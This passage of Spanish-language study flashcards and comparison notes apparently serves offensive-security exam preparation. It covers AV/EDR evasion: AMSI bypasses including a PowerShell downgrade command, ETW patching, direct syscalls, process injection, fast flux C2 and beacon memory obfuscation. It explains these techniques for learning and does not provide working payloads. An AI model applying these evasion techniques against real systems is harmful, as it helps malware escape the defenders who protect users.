**Q:** ¿Qué funciones embebidas de Python se citan para ejecutar código recibido dinámicamente?  
**A:** `compile(source, mode, exec)`, `exec()` y `eval()`.

**Q:** ¿Qué comando permite degradar PowerShell para intentar evadir AMSI?  
**A:** `powershell -version 2`.

**Q:** ¿Qué técnica AMSI se ilustra al fragmentar `Invoke-Mimikatz` en varias cadenas concatenadas?  
**A:** Ofuscación.

**Q:** ¿Qué técnica AMSI consiste en modificar `amsiSession` y `amsiContext` dentro de `AmsiUtils`?  
**A:** Forcing an error para provocar un fallo interno de AMSI.

**Q:** ¿Qué función AMSI se hookea en el memory hijacking para devolver siempre limpio?  
**A:** `AmsiScanBuffer()`.

**Q:** ¿Qué técnica permite evadir listas negras y ocultar el C2 detrás de nodos comprometidos que actúan como reverse proxies?  
**A:** Fast flux DNS.

**Q:** ¿Qué caracteriza a la timing-based evasion?  
**A:** El malware retrasa su ejecución hasta un momento concreto o hasta una interacción/evento del usuario o del sistema.

**Q:** ¿Qué busca conseguir el shellcode encryption en términos de evasión?  
**A:** Ocultar el shellcode frente a firmas estáticas cifrándolo y descifrándolo solo en memoria justo antes de ejecutarlo.

**Q:** ¿Qué significa reducir la entropía de un binario?  
**A:** Modificar sus características estadísticas para que parezca menos empaquetado, cifrado o sospechoso.

**Q:** ¿Qué función de ETW suele parchearse en `ntdll.dll` según el chunk?  
**A:** `EtwEventWrite`.

**Q:** ¿Qué ventaja buscan los direct system calls frente a llamadas API hookeadas en `ntdll.dll`?  
**A:** Evitar hooks del EDR y reducir la telemetría generada.

**Q:** ¿Qué se altera en el spoofing del thread call stack cuando el beacon entra en `Sleep()`?  
**A:** La dirección de retorno del hilo, para romper la asociación directa con el shellcode residente.

**Q:** ¿Qué ocurre con el beacon en memoria durante su fase dormida en la técnica de in-memory encryption?  
**A:** Su región de memoria ejecutable se cifra, por ejemplo con XOR, y se descifra al reanudarse.

---

## 5. Confusión frecuente

### VLAN hopping vs uso de dispositivo preautenticado
**Diferencia memorable:** uno **rompe segmentación**, el otro **recicla confianza**.  
**Criterio de decisión:** si la pregunta habla de **DTP, trunk, 802.1Q o VLANs**, es VLAN hopping. Si habla de **Raspberry Pi, dos NIC, host ya autenticado o puente entre switch y endpoint**, es pre-authenticated device.

### Ghostwriting vs Metasploit templates
**Diferencia memorable:** Ghostwriting **reescribe el binario por dentro** con junk assembly; Metasploit templates **cambia la plantilla de generación** del ejecutable.  
**Criterio de decisión:** si se menciona **desensamblar/reensamblar**, piensa en Ghostwriting. Si aparece `template.c`, `msfvenom` o recompilar con MinGW, piensa en Metasploit templates.

### Application whitelisting bypass vs signed binary proxy execution
**Diferencia memorable:** en el primero, el problema es **qué carga una app confiable**; en el segundo, el problema es **qué ejecuta un binario firmado por proxy**.  
**Criterio de decisión:** si la pista es **DLL hijacking / search order / regsvr32**, es whitelisting bypass. Si la pista es **rundll32 u otro binario firmado ejecutando código**, es signed binary proxy execution.

### Dechaining macros vs process injection
**Diferencia memorable:** dechaining **mueve la ejecución fuera de la macro**; process injection **mueve el payload dentro de otro proceso**.  
**Criterio de decisión:** si se habla de **COM, WMI, XMLDOM, Task Scheduler, registro, Startup**, es dechaining. Si aparecen `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, es process injection.

### Clearing memory hooks vs direct system calls
**Diferencia memorable:** uno **quita las cámaras**; el otro **toma una ruta que esquiva las cámaras**.  
**Criterio de decisión:** si se restauran bytes originales o se habla de unhooking, es clearing memory hooks. Si se menciona `NtAllocateVirtualMemory`, syscall IDs o `syscall <id>`, es direct syscalls.

### AMSI obfuscation vs AMSI forcing an error vs AMSI memory hijacking
**Diferencia memorable:**  
- **Obfuscation** = AMSI no reconoce el texto.  
- **Forcing an error** = AMSI falla al inicializar o usar su contexto.  
- **Memory hijacking** = AMSI analiza, pero el resultado se fuerza a limpio.  
**Criterio de decisión:** concatenación de strings → obfuscation; `AmsiUtils`, `amsiSession`, `amsiContext` → forcing an error; `AmsiScanBuffer()` → memory hijacking.

### LoLBins vs CPL side-loading
**Diferencia memorable:** LoLBins **usan lo que ya trae Windows**; CPL side-loading **disfraza la carga maliciosa como applet/control panel**.  
**Criterio de decisión:** si aparecen `ConfigSecurityPolicy.exe`, `CustomShellHost.exe` o binarios legítimos concretos, es LoLBins. Si aparecen `.cpl`, Panel de Control, `CPLResourceRunner` o DLL renombrada a `.cpl`, es CPL side-loading.

### Fast flux DNS vs hosting en infraestructura popular
**Diferencia memorable:** una técnica evade por **rotación dinámica de infraestructura**; la otra evade por **reputación de proveedor legítimo**.  
**Criterio de decisión:** rotación rápida de IP/DNS y botnets → fast flux. AWS/Google Cloud/social media como cobertura reputacional → hosting en infraestructura popular.

### Timing-based evasion vs escaping local AV sandbox
**Diferencia memorable:** la primera retrasa por **momento/evento**; la segunda explota la **ventana corta del sandbox local**.  
**Criterio de decisión:** si la pregunta habla de clics, reboot, time bombs o espera condicionada, es timing-based evasion. Si enfatiza que el AV solo observa unos segundos y el malware retrasa la carga útil para salir de esa ventana, es escaping the local AV sandbox.

### Spoofing the thread call stack vs in-memory encryption of beacon
**Diferencia memorable:** uno oculta **de dónde vuelve el hilo**; el otro oculta **qué hay en memoria mientras duerme**.  
**Criterio de decisión:** return address / `Sleep()` / stack del hilo → spoofing stack. Cifrar shellcode en reposo y restaurarlo al despertar → in-memory encryption.
